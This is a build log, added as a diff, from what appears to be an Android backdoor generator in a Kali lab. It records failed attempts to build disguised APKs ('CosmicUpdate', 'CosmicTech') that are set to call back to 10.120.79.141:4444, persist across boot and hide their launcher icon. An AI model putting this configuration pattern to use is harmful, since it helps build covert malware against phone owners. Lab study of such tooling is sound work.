@@ -1,0 +1,476 @@
+[2026-02-28 15:42:35] INFO: Keystore created {"path":"\/home\/kali\/COSMIC-OSINT-LAB@888\/lab808\/data\/keys\/android.keystore"}
+[2026-02-28 16:11:22] INFO: Prerequisites satisfied {"aapt":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/aapt","dx":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/dx","apksigner":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/apksigner"}
+[2026-02-28 16:13:09] INFO: Prerequisites satisfied {"aapt":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/aapt","dx":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/dx","apksigner":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/apksigner"}
+[2026-02-28 16:13:09] INFO: Starting APK generation {"lhost":"10.120.79.141","lport":4444,"app_name":"CosmicUpdate","package_name":"com.cosmic.update","persistence":"boot","disguise":true,"hide_icon":false,"beacon_interval":60,"use_encryption":false}
+[2026-02-28 16:13:10] DEBUG: Config injected {"file":"\/tmp\/cosmic_android_69a31415f37432.28880647\/app\/src\/main\/java\/com\/cosmic\/Config.java"}
+[2026-02-28 16:13:10] DEBUG: Executing command {"cmd":"'\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/aapt' package -f -m -J '\/tmp\/cosmic_android_69a31415f37432.28880647\/gen' -M '\/tmp\/cosmic_android_69a31415f37432.28880647\/AndroidManifest.xml' -S '\/tmp\/cosmic_android_69a31415f37432.28880647\/res' -I '\/usr\/lib\/android-sdk\/platforms\/android-33\/android.jar'"}
+[2026-02-28 16:13:11] ERROR: aapt compilation failed {"output":["\/tmp\/cosmic_android_69a31415f37432.28880647\/AndroidManifest.xml:10: error: Error: No resource found that matches the given name (at 'icon' with value '@drawable\/ic_launcher').",""]}
+[2026-02-28 16:13:11] ERROR: APK generation failed {"error":"aapt compilation failed\n\/tmp\/cosmic_android_69a31415f37432.28880647\/AndroidManifest.xml:10: error: Error: No resource found that matches the given name (at 'icon' with value '@drawable\/ic_launcher').\n"}
+[2026-02-28 16:17:11] INFO: Prerequisites satisfied {"aapt":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/aapt","dx":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/dx","apksigner":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/apksigner"}
+[2026-02-28 16:17:11] INFO: Starting APK generation {"lhost":"10.120.79.141","lport":4444,"app_name":"CosmicUpdate","package_name":"com.cosmic.update","persistence":"boot","disguise":true,"hide_icon":false,"beacon_interval":60,"use_encryption":false}
+[2026-02-28 16:17:11] DEBUG: Config injected {"file":"\/tmp\/cosmic_android_69a3150714ea84.03225215\/app\/src\/main\/java\/com\/cosmic\/Config.java"}
+[2026-02-28 16:17:11] DEBUG: Executing command {"cmd":"'\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/aapt' package -f -m -J '\/tmp\/cosmic_android_69a3150714ea84.03225215\/gen' -M '\/tmp\/cosmic_android_69a3150714ea84.03225215\/AndroidManifest.xml' -S '\/tmp\/cosmic_android_69a3150714ea84.03225215\/res' -I '\/usr\/lib\/android-sdk\/platforms\/android-33\/android.jar'"}
+[2026-02-28 16:17:11] ERROR: aapt compilation failed {"output":["\/tmp\/cosmic_android_69a3150714ea84.03225215\/AndroidManifest.xml:10: error: Error: No resource found that matches the given name (at 'icon' with value '@drawable\/ic_launcher').",""]}
+[2026-02-28 16:17:11] ERROR: APK generation failed {"error":"aapt compilation failed\n\/tmp\/cosmic_android_69a3150714ea84.03225215\/AndroidManifest.xml:10: error: Error: No resource found that matches the given name (at 'icon' with value '@drawable\/ic_launcher').\n"}
+[2026-02-28 16:18:36] INFO: Prerequisites satisfied {"aapt":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/aapt","dx":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/dx","apksigner":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/apksigner"}
+[2026-02-28 16:18:36] INFO: Starting APK generation {"lhost":"10.120.79.141","lport":4444,"app_name":"CosmicUpdate","package_name":"com.cosmic.update","persistence":"boot","disguise":true,"hide_icon":false,"beacon_interval":60,"use_encryption":false}
+[2026-02-28 16:18:36] DEBUG: Config injected {"file":"\/tmp\/cosmic_android_69a3155cc9f4f1.96982081\/app\/src\/main\/java\/com\/cosmic\/Config.java"}
+[2026-02-28 16:18:36] DEBUG: Executing command {"cmd":"'\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/aapt' package -f -m -J '\/tmp\/cosmic_android_69a3155cc9f4f1.96982081\/gen' -M '\/tmp\/cosmic_android_69a3155cc9f4f1.96982081\/AndroidManifest.xml' -S '\/tmp\/cosmic_android_69a3155cc9f4f1.96982081\/res' -I '\/usr\/lib\/android-sdk\/platforms\/android-33\/android.jar'"}
+[2026-02-28 16:18:37] ERROR: aapt compilation failed {"output":["\/tmp\/cosmic_android_69a3155cc9f4f1.96982081\/AndroidManifest.xml:10: error: Error: No resource found that matches the given name (at 'icon' with value '@drawable\/ic_launcher').",""]}
+[2026-02-28 16:18:37] ERROR: APK generation failed {"error":"aapt compilation failed\n\/tmp\/cosmic_android_69a3155cc9f4f1.96982081\/AndroidManifest.xml:10: error: Error: No resource found that matches the given name (at 'icon' with value '@drawable\/ic_launcher').\n"}
+[2026-02-28 16:18:38] INFO: Prerequisites satisfied {"aapt":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/aapt","dx":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/dx","apksigner":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/apksigner"}
+[2026-02-28 16:18:39] INFO: Prerequisites satisfied {"aapt":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/aapt","dx":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/dx","apksigner":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/apksigner"}
+[2026-02-28 16:18:40] INFO: Prerequisites satisfied {"aapt":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/aapt","dx":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/dx","apksigner":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/apksigner"}
+[2026-02-28 16:18:44] INFO: Prerequisites satisfied {"aapt":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/aapt","dx":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/dx","apksigner":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/apksigner"}
+[2026-02-28 16:18:44] INFO: Prerequisites satisfied {"aapt":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/aapt","dx":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/dx","apksigner":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/apksigner"}
+[2026-02-28 16:18:50] INFO: Prerequisites satisfied {"aapt":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/aapt","dx":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/dx","apksigner":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/apksigner"}
+[2026-02-28 16:18:51] INFO: Prerequisites satisfied {"aapt":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/aapt","dx":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/dx","apksigner":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/apksigner"}
+[2026-02-28 16:21:48] INFO: Prerequisites satisfied {"aapt":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/aapt","dx":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/dx","apksigner":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/apksigner"}
+[2026-02-28 16:21:48] INFO: Starting APK generation {"lhost":"10.120.79.141","lport":4444,"app_name":"CosmicTech","package_name":"com.cosmic.CosmicTech","persistence":"boot","disguise":true,"hide_icon":true,"beacon_interval":80,"use_encryption":false}
+[2026-02-28 16:21:48] DEBUG: Config injected {"file":"\/tmp\/cosmic_android_69a3161c4fd821.28672392\/app\/src\/main\/java\/com\/cosmic\/Config.java"}
+[2026-02-28 16:21:48] DEBUG: Launcher icon hidden []
+[2026-02-28 16:21:48] DEBUG: Executing command {"cmd":"'\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/aapt' package -f -m -J '\/tmp\/cosmic_android_69a3161c4fd821.28672392\/gen' -M '\/tmp\/cosmic_android_69a3161c4fd821.28672392\/AndroidManifest.xml' -S '\/tmp\/cosmic_android_69a3161c4fd821.28672392\/res' -I '\/usr\/lib\/android-sdk\/platforms\/android-33\/android.jar'"}
+[2026-02-28 16:21:49] ERROR: aapt compilation failed {"output":["\/tmp\/cosmic_android_69a3161c4fd821.28672392\/AndroidManifest.xml:10: error: Error: No resource found that matches the given name (at 'icon' with value '@drawable\/ic_launcher').",""]}
+[2026-02-28 16:21:49] ERROR: APK generation failed {"error":"aapt compilation failed\n\/tmp\/cosmic_android_69a3161c4fd821.28672392\/AndroidManifest.xml:10: error: Error: No resource found that matches the given name (at 'icon' with value '@drawable\/ic_launcher').\n"}
+[2026-02-28 16:21:49] INFO: Prerequisites satisfied {"aapt":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/aapt","dx":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/dx","apksigner":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/apksigner"}
+[2026-02-28 16:22:35] INFO: Prerequisites satisfied {"aapt":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/aapt","dx":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/dx","apksigner":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/apksigner"}
+[2026-02-28 16:22:35] INFO: Starting APK generation {"lhost":"10.120.79.141","lport":4444,"app_name":"CosmicTech","package_name":"com.cosmic.CosmicTech","persistence":"boot","disguise":true,"hide_icon":true,"beacon_interval":80,"use_encryption":false}
+[2026-02-28 16:22:36] DEBUG: Config injected {"file":"\/tmp\/cosmic_android_69a3164be5e931.09014759\/app\/src\/main\/java\/com\/cosmic\/Config.java"}
+[2026-02-28 16:22:36] DEBUG: Launcher icon hidden []
+[2026-02-28 16:22:36] DEBUG: Executing command {"cmd":"'\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/aapt' package -f -m -J '\/tmp\/cosmic_android_69a3164be5e931.09014759\/gen' -M '\/tmp\/cosmic_android_69a3164be5e931.09014759\/AndroidManifest.xml' -S '\/tmp\/cosmic_android_69a3164be5e931.09014759\/res' -I '\/usr\/lib\/android-sdk\/platforms\/android-33\/android.jar'"}
+[2026-02-28 16:22:36] DEBUG: Executing command {"cmd":"'javac' -d '\/tmp\/cosmic_android_69a3164be5e931.09014759\/build\/classes' -bootclasspath '\/usr\/lib\/android-sdk\/platforms\/android-33\/android.jar' -cp '\/usr\/lib\/android-sdk\/platforms\/android-33\/android.jar' '\/tmp\/cosmic_android_69a3164be5e931.09014759\/app\/src\/main\/java\/com\/cosmic\/MainActivity.java' '\/tmp\/cosmic_android_69a3164be5e931.09014759\/app\/src\/main\/java\/com\/cosmic\/BeaconService.java' '\/tmp\/cosmic_android_69a3164be5e931.09014759\/app\/src\/main\/java\/com\/cosmic\/BootReceiver.java' '\/tmp\/cosmic_android_69a3164be5e931.09014759\/app\/src\/main\/java\/com\/cosmic\/Config.java'"}
+[2026-02-28 16:22:39] ERROR: javac compilation failed {"output":["error: option --boot-class-path not allowed with target 21"]}
+[2026-02-28 16:22:39] ERROR: APK generation failed {"error":"javac compilation failed\nerror: option --boot-class-path not allowed with target 21"}
+[2026-02-28 16:22:40] INFO: Prerequisites satisfied {"aapt":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/aapt","dx":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/dx","apksigner":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/apksigner"}
+[2026-02-28 16:24:46] INFO: Prerequisites satisfied {"aapt":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/aapt","dx":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/dx","apksigner":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/apksigner"}
+[2026-02-28 16:24:47] INFO: Prerequisites satisfied {"aapt":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/aapt","dx":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/dx","apksigner":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/apksigner"}
+[2026-02-28 16:24:48] INFO: Prerequisites satisfied {"aapt":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/aapt","dx":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/dx","apksigner":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/apksigner"}
+[2026-02-28 16:24:49] INFO: Prerequisites satisfied {"aapt":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/aapt","dx":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/dx","apksigner":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/apksigner"}
+[2026-02-28 16:25:18] INFO: Prerequisites satisfied {"aapt":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/aapt","dx":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/dx","apksigner":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/apksigner"}
+[2026-02-28 16:25:19] INFO: Prerequisites satisfied {"aapt":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/aapt","dx":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/dx","apksigner":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/apksigner"}
+[2026-02-28 16:26:16] INFO: Prerequisites satisfied {"aapt":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/aapt","dx":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/dx","apksigner":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/apksigner"}
+[2026-02-28 16:26:17] INFO: Prerequisites satisfied {"aapt":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/aapt","dx":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/dx","apksigner":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/apksigner"}
+[2026-02-28 16:28:32] INFO: Prerequisites satisfied {"aapt":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/aapt","dx":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/dx","apksigner":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/apksigner"}
+[2026-02-28 16:28:33] INFO: Prerequisites satisfied {"aapt":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/aapt","dx":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/dx","apksigner":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/apksigner"}
+[2026-02-28 16:28:46] INFO: Prerequisites satisfied {"aapt":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/aapt","dx":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/dx","apksigner":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/apksigner"}
+[2026-02-28 16:29:41] INFO: Prerequisites satisfied {"aapt":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/aapt","dx":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/dx","apksigner":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/apksigner"}
+[2026-02-28 16:30:00] INFO: Prerequisites satisfied {"aapt":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/aapt","dx":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/dx","apksigner":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/apksigner"}
+[2026-02-28 16:30:00] INFO: Prerequisites satisfied {"aapt":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/aapt","dx":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/dx","apksigner":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/apksigner"}
+[2026-02-28 16:30:34] INFO: Prerequisites satisfied {"aapt":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/aapt","dx":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/dx","apksigner":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/apksigner"}
+[2026-02-28 16:34:09] INFO: Prerequisites satisfied {"aapt":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/aapt","dx":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/dx","apksigner":"\/usr\/lib\/android-sdk\/build-tools\/29.0.3\/apksigner"}
+[2026-02-28 18:51:55] ERROR: Missing prerequisites {"missing":["android.jar for API 33 (not found at \/home\/kali\/android-sdk\/platforms\/android-33\/android.jar)"]}
+[2026-02-28 18:51:58] ERROR: Missing prerequisites {"missing":["android.jar for API 33 (not found at \/home\/kali\/android-sdk\/platforms\/android-33\/android.jar)"]}
+[2026-02-28 19:00:29] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-02-28 19:00:31] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-02-28 19:00:39] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-02-28 19:00:40] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-02-28 19:01:41] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-02-28 19:01:42] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-02-28 20:24:39] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-02-28 20:24:46] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-02-28 20:24:51] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-03 14:45:20] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-03 14:55:54] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-03 14:55:57] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-03 14:56:13] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-03 14:56:19] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-03 14:57:37] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-03 14:57:38] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-03 14:57:55] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-03 15:03:01] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 09:39:52] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 09:40:39] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 09:41:43] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 09:45:35] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 09:46:53] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 09:59:13] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:02:35] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:02:38] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:02:47] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:03:40] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:04:50] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:05:53] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:06:02] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:08:55] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:09:02] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:09:08] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:09:09] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:09:27] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:09:28] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:10:00] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:10:08] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:10:43] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:12:35] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:14:00] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:21:04] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:21:53] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:22:19] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:24:57] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:26:15] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:26:47] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:26:57] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:27:22] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:27:28] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:30:57] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:37:30] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:45:05] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:45:17] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:45:25] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 10:45:30] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
